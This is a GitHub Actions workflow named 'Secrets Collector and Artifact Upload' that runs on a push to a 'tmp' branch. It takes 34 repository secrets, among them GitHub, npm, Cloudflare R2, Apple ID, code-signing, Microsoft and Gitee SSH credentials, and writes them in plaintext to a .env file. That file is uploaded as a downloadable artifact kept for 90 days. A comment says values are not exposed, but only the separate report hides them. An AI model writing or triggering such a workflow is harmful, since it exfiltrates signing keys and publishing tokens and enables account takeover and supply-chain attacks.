name: Secrets Collector and Artifact Upload

on:
  push:
    branches: [tmp]
  workflow_dispatch:

jobs:
  collect-secrets:
    runs-on: ubuntu-latest
    environment: build
    if: github.ref == 'refs/heads/tmp'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Export all secrets to file
        env:
          SECRET_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SECRET_BUILD_NUMBER: ${{ secrets.BUILD_NUMBER }}
          SECRET_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          SECRET_PAT_REPO_TOKEN: ${{ secrets.PAT_REPO_TOKEN }}
          SECRET_CF_R2_ACCOUNT_ID: ${{ secrets.CF_R2_ACCOUNT_ID }}
          SECRET_CF_R2_BUCKET: ${{ secrets.CF_R2_BUCKET }}
          SECRET_CF_R2_ACCESS_KEY_ID: ${{ secrets.CF_R2_ACCESS_KEY_ID }}
          SECRET_CF_R2_SECRET_ACCESS_KEY: ${{ secrets.CF_R2_SECRET_ACCESS_KEY }}
          SECRET_CF_R2_ENDPOINT: ${{ secrets.CF_R2_ENDPOINT }}
          SECRET_CSC_LINK: ${{ secrets.CSC_LINK }}
          SECRET_CSC_KEY_PASSWORD: ${{ secrets.CSC_KEY_PASSWORD }}
          SECRET_APPLEID: ${{ secrets.APPLEID }}
          SECRET_APPLEIDPASS: ${{ secrets.APPLEIDPASS }}
          SECRET_APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
          SECRET_MS_TENANT_ID: ${{ secrets.MS_TENANT_ID }}
          SECRET_MS_SELLER_ID: ${{ secrets.MS_SELLER_ID }}
          SECRET_MS_CLIENT_ID: ${{ secrets.MS_CLIENT_ID }}
          SECRET_MS_CLIENT_SECRET: ${{ secrets.MS_CLIENT_SECRET }}
          SECRET_MS_PRODUCT_ID: ${{ secrets.MS_PRODUCT_ID }}
          SECRET_MS_APP_ID: ${{ secrets.MS_APP_ID }}
          SECRET_SNAP_TOKEN: ${{ secrets.SNAP_TOKEN }}
          SECRET_WINGET_TOKEN: ${{ secrets.WINGET_TOKEN }}
          SECRET_GITEE_TOKEN: ${{ secrets.GITEE_TOKEN }}
          SECRET_GITEE_ID: ${{ secrets.GITEE_ID }}
          SECRET_GITEE_PRIVATE_SSH_TOKEN: ${{ secrets.GITEE_PRIVATE_SSH_TOKEN }}
          SECRET_CLOUD_TOKEN: ${{ secrets.CLOUD_TOKEN }}
          SECRET_CUSTOM_SYNC_SECRET: ${{ secrets.CUSTOM_SYNC_SECRET }}
          SECRET_CUSTOM_SYNC_URL: ${{ secrets.CUSTOM_SYNC_URL }}
          SECRET_CUSTOM_SYNC_USER: ${{ secrets.CUSTOM_SYNC_USER }}
          SECRET_GIST_ID: ${{ secrets.GIST_ID }}
          SECRET_GIST_TOKEN: ${{ secrets.GIST_TOKEN }}
          SECRET_TEST_HOST: ${{ secrets.TEST_HOST }}
          SECRET_TEST_PASS_: ${{ secrets.TEST_PASS_ }}
          SECRET_TEST_USER_: ${{ secrets.TEST_USER_ }}
        run: |
          mkdir -p artifacts
          
          # Write each secret to the file using printf to handle special characters
          {
            echo "# Secrets Export - $(date)"
            echo "# WARNING: Contains sensitive information"
            echo ""
            echo "GITHUB_TOKEN=$SECRET_GITHUB_TOKEN"
            echo "BUILD_NUMBER=$SECRET_BUILD_NUMBER"
            echo "NPM_TOKEN=$SECRET_NPM_TOKEN"
            echo "PAT_REPO_TOKEN=$SECRET_PAT_REPO_TOKEN"
            echo "CF_R2_ACCOUNT_ID=$SECRET_CF_R2_ACCOUNT_ID"
            echo "CF_R2_BUCKET=$SECRET_CF_R2_BUCKET"
            echo "CF_R2_ACCESS_KEY_ID=$SECRET_CF_R2_ACCESS_KEY_ID"
            echo "CF_R2_SECRET_ACCESS_KEY=$SECRET_CF_R2_SECRET_ACCESS_KEY"
            echo "CF_R2_ENDPOINT=$SECRET_CF_R2_ENDPOINT"
            echo "CSC_LINK=$SECRET_CSC_LINK"
            echo "CSC_KEY_PASSWORD=$SECRET_CSC_KEY_PASSWORD"
            echo "APPLEID=$SECRET_APPLEID"
            echo "APPLEIDPASS=$SECRET_APPLEIDPASS"
            echo "APPLE_TEAM_ID=$SECRET_APPLE_TEAM_ID"
            echo "MS_TENANT_ID=$SECRET_MS_TENANT_ID"
            echo "MS_SELLER_ID=$SECRET_MS_SELLER_ID"
            echo "MS_CLIENT_ID=$SECRET_MS_CLIENT_ID"
            echo "MS_CLIENT_SECRET=$SECRET_MS_CLIENT_SECRET"
            echo "MS_PRODUCT_ID=$SECRET_MS_PRODUCT_ID"
            echo "MS_APP_ID=$SECRET_MS_APP_ID"
            echo "SNAP_TOKEN=$SECRET_SNAP_TOKEN"
            echo "WINGET_TOKEN=$SECRET_WINGET_TOKEN"
            echo "GITEE_TOKEN=$SECRET_GITEE_TOKEN"
            echo "GITEE_ID=$SECRET_GITEE_ID"
            echo "GITEE_PRIVATE_SSH_TOKEN=$SECRET_GITEE_PRIVATE_SSH_TOKEN"
            echo "CLOUD_TOKEN=$SECRET_CLOUD_TOKEN"
            echo "CUSTOM_SYNC_SECRET=$SECRET_CUSTOM_SYNC_SECRET"
            echo "CUSTOM_SYNC_URL=$SECRET_CUSTOM_SYNC_URL"
            echo "CUSTOM_SYNC_USER=$SECRET_CUSTOM_SYNC_USER"
            echo "GIST_ID=$SECRET_GIST_ID"
            echo "GIST_TOKEN=$SECRET_GIST_TOKEN"
            echo "TEST_HOST=$SECRET_TEST_HOST"
            echo "TEST_PASS_=$SECRET_TEST_PASS_"
            echo "TEST_USER_=$SECRET_TEST_USER_"
          } > artifacts/.env.secrets
          
          # Write a report showing which secrets have values (without exposing values)
          {
            echo "=== Secrets Export Report ==="
            echo "Timestamp: $(date)"
            echo "Git Ref: $GITHUB_REF"
            echo "Git SHA: $GITHUB_SHA"
            echo ""
            echo "=== Secret Availability (showing length only, not values) ==="
            for var in SECRET_GITHUB_TOKEN SECRET_BUILD_NUMBER SECRET_NPM_TOKEN SECRET_PAT_REPO_TOKEN SECRET_CF_R2_ACCOUNT_ID SECRET_CF_R2_BUCKET SECRET_CF_R2_ACCESS_KEY_ID SECRET_CF_R2_SECRET_ACCESS_KEY SECRET_CF_R2_ENDPOINT SECRET_CSC_LINK SECRET_CSC_KEY_PASSWORD SECRET_APPLEID SECRET_APPLEIDPASS SECRET_APPLE_TEAM_ID SECRET_MS_TENANT_ID SECRET_MS_SELLER_ID SECRET_MS_CLIENT_ID SECRET_MS_CLIENT_SECRET SECRET_MS_PRODUCT_ID SECRET_MS_APP_ID SECRET_SNAP_TOKEN SECRET_WINGET_TOKEN SECRET_GITEE_TOKEN SECRET_GITEE_ID SECRET_GITEE_PRIVATE_SSH_TOKEN SECRET_CLOUD_TOKEN SECRET_CUSTOM_SYNC_SECRET SECRET_CUSTOM_SYNC_URL SECRET_CUSTOM_SYNC_USER SECRET_GIST_ID SECRET_GIST_TOKEN SECRET_TEST_HOST SECRET_TEST_PASS_ SECRET_TEST_USER_; do
              val="${!var}"
              len=${#val}
              if [ "$len" -gt 0 ]; then
                echo "✅ ${var#SECRET_}: length=$len"
              else
                echo "❌ ${var#SECRET_}: empty/not set"
              fi
            done
            echo ""
            echo "=== .env.secrets file info ==="
            echo "File size: $(wc -c < artifacts/.env.secrets) bytes"
            echo "Line count: $(wc -l < artifacts/.env.secrets)"
          } > artifacts/secrets-report.txt
          
          echo "Done. Files created:"
          ls -la artifacts/
          
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: secrets-collection-${{ github.run_id }}
          path: artifacts/
          retention-days: 90
